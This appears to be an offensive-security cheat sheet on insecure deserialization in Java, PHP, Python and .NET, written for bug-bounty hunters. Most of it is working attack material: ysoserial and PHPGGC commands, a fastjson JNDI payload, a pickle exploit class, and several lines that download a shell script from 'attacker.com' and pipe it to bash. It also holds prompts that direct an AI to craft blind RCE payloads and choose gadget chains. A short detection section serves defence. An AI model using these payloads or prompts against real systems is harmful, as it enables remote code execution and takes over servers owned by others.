---
id: "deserialization"
title: "Insecure Deserialization - Java, PHP, Python, .NET"
type: "technique"
category: "web-application"
subcategory: "deserialization"
tags: ["deserialization", "java", "php", "python", "dotnet", "rce", "gadget-chains", "ysoserial"]
difficulty: "advanced"
platforms: ["linux", "macos", "windows"]
related: ["xxe", "ssti-payloads", "command-injection-payloads"]
updated: "2026-03-30"
---

## Overview

Insecure deserialization occurs when applications reconstruct objects from user-controlled serialized data without validation. It consistently leads to critical severity — RCE, auth bypass, or data tampering. Typical payout: $5k-$50k. Found in Java (most common), PHP, Python, .NET, and Ruby applications.

## Detection

### Identify serialized data
```
# Java serialized objects (magic bytes)
ac ed 00 05  (hex)
rO0AB        (base64 prefix)

# PHP serialized
O:4:"User":2:{s:4:"name";...}
a:2:{i:0;s:5:"hello";...}

# Python pickle
\x80\x03  (protocol 3)
gASV...   (base64)

# .NET ViewState
/wEPDw...  (base64, starts with /wEP or /wFP)

# JSON with type hints
{"@type":"com.example.Class", ...}  (fastjson)
{"__class__": "module.Class", ...}  (Python)
```

### Common locations
- Cookies (session objects, remember-me tokens)
- Hidden form fields (ViewState, serialized state)
- API request bodies
- Message queues (RabbitMQ, Redis, Kafka)
- Cache stores (Memcached, Redis)
- JWT claims (when custom deserializers are used)

## Java Deserialization

### ysoserial — generate exploit payloads
```bash
# Generate RCE payload with CommonsCollections chain
java -jar ysoserial-all.jar CommonsCollections1 'curl http://attacker.com/rce' | base64

# Common gadget chains (try all until one works)
CommonsCollections1   # Apache Commons Collections 3.1
CommonsCollections5   # Apache Commons Collections 3.1 (no InvokerTransformer)
CommonsCollections6   # Apache Commons Collections 3.1 (HashSet)
CommonsCollections7   # Apache Commons Collections 3.1 (Hashtable)
CommonsBeanutils1     # Apache Commons Beanutils
Spring1               # Spring Framework
Spring2               # Spring Framework
JBossInterceptors1    # JBoss
Hibernate1            # Hibernate
Groovy1               # Groovy
Jdk7u21               # JDK <= 7u21
```

### JNDI injection (Java 8+)
```bash
# Use marshalsec for JNDI exploitation
java -cp marshalsec-all.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Exploit"

# Payload triggers JNDI lookup
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}
```

### Detection signatures in traffic
```
# Look for these in cookies, headers, POST bodies
rO0AB       # Base64 Java serialized object
H4sIAAAA    # GZip + Base64 Java serialized
```

## PHP Deserialization

### PHPGGC — PHP gadget chains
```bash
# List available chains
phpggc -l

# Generate payload for Laravel RCE
phpggc Laravel/RCE1 system 'id' -b  # base64 output
phpggc Symfony/RCE4 exec 'curl attacker.com/shell.sh|bash'

# Key frameworks
Laravel/RCE1-10     # Laravel
Symfony/RCE1-4      # Symfony
WordPress/RCE1-2    # WordPress (WooCommerce)
Magento/SQLI1       # Magento SQL injection via deserialization
Drupal/RCE1         # Drupal
Slim/RCE1           # Slim Framework
```

### Phar deserialization (no unserialize needed)
```php
// Upload a .phar disguised as .jpg
// Trigger via phar:// wrapper in file operations
// file_exists('phar:///uploads/evil.jpg')
// getimagesize('phar:///uploads/evil.jpg')
// Any function that triggers stat() on phar://
```

### Magic methods to target
```php
__wakeup()    // Called on unserialize()
__destruct()  // Called when object is destroyed
__toString()  // Called in string context
__call()      // Called on undefined method
```

## Python Deserialization

### Pickle RCE (trivially exploitable)
```python
import pickle, os, base64

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/shell.sh|bash',))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload.decode())
```

### Other dangerous deserializers
```python
# yaml.load() without SafeLoader
import yaml
yaml.load(user_input)  # RCE via !!python/object/apply

# jsonpickle
import jsonpickle
jsonpickle.decode(user_input)  # RCE

# shelve module
import shelve
db = shelve.open(user_controlled_path)  # pickle-based
```

## .NET Deserialization

### ysoserial.net
```bash
# Generate payload
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd.exe /c curl attacker.com"
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"

# Dangerous formatters
BinaryFormatter       # Most common, extremely dangerous
SoapFormatter         # SOAP-based serialization
LosFormatter          # ASP.NET loss-of-state
ObjectStateFormatter  # ASP.NET state
Json.Net              # With TypeNameHandling != None
```

### ViewState deserialization
```
# If ViewState MAC validation is disabled:
# 1. Find __VIEWSTATEGENERATOR value
# 2. Generate malicious ViewState with ysoserial.net
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd.exe /c whoami" --validationalg="SHA1" --validationkey="KEY"
```

## Deep Dig Prompts

```
Given this application [describe technology stack, cookies, request format]:
1. Identify all locations where serialized data is processed.
2. Determine the serialization format (Java/PHP/Python/.NET).
3. Suggest specific gadget chains based on known libraries/frameworks.
4. Craft a blind RCE payload with DNS/HTTP callback for verification.
5. If direct RCE fails, test for object injection (auth bypass, data tampering).
```

```
I found a Java serialized object in [cookie/header/body]:
1. Decode and analyze the class structure.
2. Identify the classpath — which libraries are available for gadget chains?
3. Generate ysoserial payloads for the top 5 most likely chains.
4. Test for JNDI injection if the application uses a modern JDK.
```

## Tools

- **ysoserial** — Java gadget chain payload generator
- **ysoserial.net** — .NET gadget chain payload generator
- **PHPGGC** — PHP gadget chain generator
- **marshalsec** — JNDI exploitation utility
- **Java Deserialization Scanner** — Burp extension
- **Freddy** — Burp extension for deserialization detection
- **GadgetInspector** — Automated Java gadget chain discovery
